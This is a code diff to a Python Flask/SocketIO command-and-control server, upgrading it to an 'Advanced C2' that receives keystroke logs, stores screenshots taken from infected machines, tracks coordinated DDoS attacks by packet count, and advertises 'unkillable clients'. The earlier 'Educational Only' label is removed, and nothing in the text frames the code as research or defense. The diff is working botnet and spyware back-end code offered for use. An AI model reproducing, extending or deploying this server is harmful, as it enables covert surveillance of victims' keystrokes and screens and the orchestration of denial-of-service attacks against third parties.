@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-C2 SERVER - Clean & Simple
-Features: Multiple clients, Command execution, File upload/download
+C2 SERVER - Advanced Version with All Features
+Features: DDoS Monitoring, Keylogger, Screenshots, Keep-Alive
 """
 
 from flask import Flask, request, jsonify, send_file
@@ -25,6 +25,7 @@ app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB
 # Storage
 os.makedirs('uploads', exist_ok=True)
 os.makedirs('downloads', exist_ok=True)
+os.makedirs('screenshots', exist_ok=True)
 
 # SocketIO with threading
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
@@ -35,14 +36,16 @@ client_sockets = {}  # {client_id: socket_id}
 command_results = {}  # {command_id: result}
 pending_commands = defaultdict(list)  # {client_id: [commands]}
 authenticated_sessions = {}  # {session_id: expiry}
+console_sockets = []  # List of console socket IDs
+attack_stats = {}  # {attack_id: {clients: {client_id: packets}, total_packets: X}}
 
 # Dashboard password
 DASHBOARD_PASSWORD = "C2RICARDO"
 
 print("""
 ╔══════════════════════════════════════════════════════════════╗
-║                      C2 SERVER v1.0                          ║
-║            Simple • Fast • Educational Only                  ║
+║               ADVANCED C2 SERVER v3.0                        ║
+║   DDoS • Keylogger • Screenshots • Multi-Client             ║
 ╚══════════════════════════════════════════════════════════════╝
 """)
 
@@ -188,7 +191,7 @@ def login_html():
     </head>
     <body>
         <div class="login-box">
-            <h1>🔒 C2 SERVER</h1>
+            <h1>🔒 ADVANCED C2 SERVER</h1>
             <p class="subtitle">Authorized Access Only</p>
             <form method="POST" action="/auth">
                 <input type="password" name="password" placeholder="Enter Password" required autofocus>
@@ -209,7 +212,7 @@ def dashboard_html():
     <!DOCTYPE html>
     <html>
     <head>
-        <title>C2 Server Dashboard</title>
+        <title>Advanced C2 Server Dashboard</title>
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <style>
             * {{ margin: 0; padding: 0; box-sizing: border-box; }}
@@ -299,8 +302,8 @@ def dashboard_html():
     <body>
         <div class="container">
             <div class="header">
-                <h1>🛸 C2 SERVER <span class="pulse">●</span></h1>
-                <p class="status">OPERATIONAL • SECURE • PRIVATE</p>
+                <h1>⚡ ADVANCED C2 SERVER <span class="pulse">●</span></h1>
+                <p class="status">DDoS • KEYLOGGER • SCREENSHOTS • MULTI-CLIENT</p>
             </div>
             
             <div class="stats">
@@ -319,18 +322,20 @@ def dashboard_html():
             </div>
             
             <div class="info">
-                <h3>📋 STATUS</h3>
-                <p>✓ Server is running and accepting connections</p>
-                <p>✓ WebSocket connections enabled</p>
-                <p>✓ File transfer system active</p>
-                <p>✓ Command queue processing</p>
+                <h3>📋 FEATURES</h3>
+                <p>✓ DDoS Attack Orchestration</p>
+                <p>✓ Real-time Keylogging</p>
+                <p>✓ Screenshot Capture</p>
+                <p>✓ File Upload/Download</p>
+                <p>✓ Keep-Alive System</p>
+                <p>✓ Unkillable Clients</p>
             </div>
             
             <div class="info">
                 <h3>🎮 USAGE</h3>
-                <p>Run console: <code>python console.py</code></p>
-                <p>Run client on target: <code>python client.py &lt;server_url&gt;</code></p>
-                <p>Use console commands to control clients</p>
+                <p>Run console: <code>python console.py &lt;server_url&gt;</code></p>
+                <p>Run client: <code>python client.py &lt;server_url&gt;</code></p>
+                <p>Use console commands for full control</p>
             </div>
             
             <div class="logout">
@@ -362,6 +367,7 @@ def get_stats():
         'total': len(clients),
         'online': online,
         'commands': len(command_results),
+        'screenshots': len([f for f in os.listdir('screenshots') if f.endswith('.png')]),
         'timestamp': time.time()
     })
 
@@ -475,6 +481,11 @@ def download_file(file_id):
     else:
         return jsonify({'error': 'File not found'}), 404
 
+@app.route('/api/ping')
+def ping():
+    """Keep-alive endpoint"""
+    return jsonify({'status': 'alive', 'timestamp': time.time()})
+
 # ============= WEBSOCKET EVENTS =============
 
 @socketio.on('connect')
@@ -496,6 +507,10 @@ def handle_disconnect():
             # Notify consoles
             socketio.emit('client_offline', {'client_id': client_id}, namespace='/')
             break
+    
+    # Remove console socket
+    if request.sid in console_sockets:
+        console_sockets.remove(request.sid)
 
 @socketio.on('register')
 def handle_register(data):
@@ -562,7 +577,6 @@ def handle_result(data):
     client_id = data.get('client_id')
     
     print(f"[*] Result received: {cmd_id} from {client_id}")
-    print(f"    Output length: {len(data.get('output', ''))} chars")
     
     # Store result
     command_results[cmd_id] = {
@@ -575,10 +589,8 @@ def handle_result(data):
         'timestamp': time.time()
     }
     
-    # Notify all consoles immediately (no broadcast param, namespace='/' means all)
+    # Notify all consoles
     socketio.emit('command_result', command_results[cmd_id], namespace='/')
-    
-    # Also notify specific client room
     socketio.emit('result_ready', command_results[cmd_id], room=client_id, namespace='/')
 
 @socketio.on('file_download')
@@ -609,16 +621,131 @@ def handle_file_download(data):
 def handle_console_connect(data):
     """Console connects for updates"""
     print(f"[+] Console connected: {request.sid}")
+    console_sockets.append(request.sid)
     emit('console_ready', {'message': 'Connected to C2 server'})
+
+@socketio.on('ping')
+def handle_ping(data):
+    """Handle ping from console"""
+    emit('pong', {'timestamp': time.time()})
+
+@socketio.on('ping_client')
+def handle_ping_client(data):
+    """Forward ping to client"""
+    client_id = data.get('client_id')
+    if client_id in client_sockets:
+        socketio.emit('ping_client', data, room=client_sockets[client_id])
+
+@socketio.on('keylog')
+def handle_keylog(data):
+    """Forward keylog to consoles"""
+    socketio.emit('keylog', data, namespace='/')
+
+@socketio.on('screenshot')
+def handle_screenshot(data):
+    """Handle screenshot from client"""
+    client_id = data.get('client_id')
+    img_data = data.get('data')
+    
+    if img_data:
+        # Decode and save screenshot
+        try:
+            file_bytes = base64.b64decode(img_data)
+            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+            client_short = client_id[:8] if len(client_id) > 8 else client_id
+            filename = f"screenshot_{client_short}_{timestamp}.png"
+            file_path = os.path.join('screenshots', filename)
+            
+            with open(file_path, 'wb') as f:
+                f.write(file_bytes)
+            
+            print(f"[📸] Screenshot received: {filename} ({len(file_bytes)} bytes)")
+            
+            # Forward to consoles
+            socketio.emit('screenshot', {
+                'client_id': client_id,
+                'filename': filename,
+                'size': len(file_bytes),
+                'timestamp': time.time()
+            }, namespace='/')
+        
+        except Exception as e:
+            print(f"[!] Screenshot save error: {e}")
+
+@socketio.on('alert')
+def handle_alert(data):
+    """Forward alert to consoles"""
+    socketio.emit('alert', data, namespace='/')
+
+@socketio.on('attack_status')
+def handle_attack_status(data):
+    """Handle DDoS attack status update"""
+    attack_id = data.get('attack_id')
+    client_id = data.get('client_id')
+    packets_sent = data.get('packets_sent', 0)
+    status = data.get('status', 'running')
+    
+    if attack_id not in attack_stats:
+        attack_stats[attack_id] = {'clients': {}, 'total_packets': 0, 'start_time': time.time()}
+    
+    attack_stats[attack_id]['clients'][client_id] = packets_sent
+    attack_stats[attack_id]['total_packets'] = sum(attack_stats[attack_id]['clients'].values())
+    
+    # Forward to consoles
+    socketio.emit('attack_status', data, namespace='/')
+    
+    # Log attack status
+    print(f"[💥] Attack {attack_id[:8]}: {client_id[:8]} sent {packets_sent:,} packets")
+
+@socketio.on('client_pong')
+def handle_client_pong(data):
+    """Forward client pong to consoles"""
+    socketio.emit('client_pong', data, namespace='/')
+
+# ============= CLEANUP THREAD =============
+
+def cleanup_thread():
+    """Cleanup old data periodically"""
+    while True:
+        try:
+            # Clean old command results (older than 1 hour)
+            cutoff = time.time() - 3600
+            old_cmds = [cmd_id for cmd_id, result in command_results.items() 
+                       if result.get('timestamp', 0) < cutoff]
+            for cmd_id in old_cmds:
+                del command_results[cmd_id]
+            
+            # Clean old files
+            for folder in ['downloads', 'uploads', 'screenshots']:
+                if os.path.exists(folder):
+                    cutoff_time = time.time() - 86400  # 24 hours
+                    for filename in os.listdir(folder):
+                        filepath = os.path.join(folder, filename)
+                        if os.path.isfile(filepath):
+                            if os.path.getmtime(filepath) < cutoff_time:
+                                try:
+                                    os.remove(filepath)
+                                except:
+                                    pass
+            
+            time.sleep(300)  # Run every 5 minutes
+            
+        except Exception as e:
+            print(f"[!] Cleanup error: {e}")
+            time.sleep(60)
+
+# Start cleanup thread
+threading.Thread(target=cleanup_thread, daemon=True).start()
 
 # ============= MAIN =============
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     
-    print(f"[*] Starting C2 Server on port {port}")
+    print(f"[*] Starting Advanced C2 Server on port {port}")
     print(f"[*] Dashboard: http://0.0.0.0:{port}")
     print(f"[*] WebSocket: ws://0.0.0.0:{port}/socket.io")
+    print(f"[*] Features: DDoS, Keylogger, Screenshots, Keep-Alive")
     print()
     
     socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
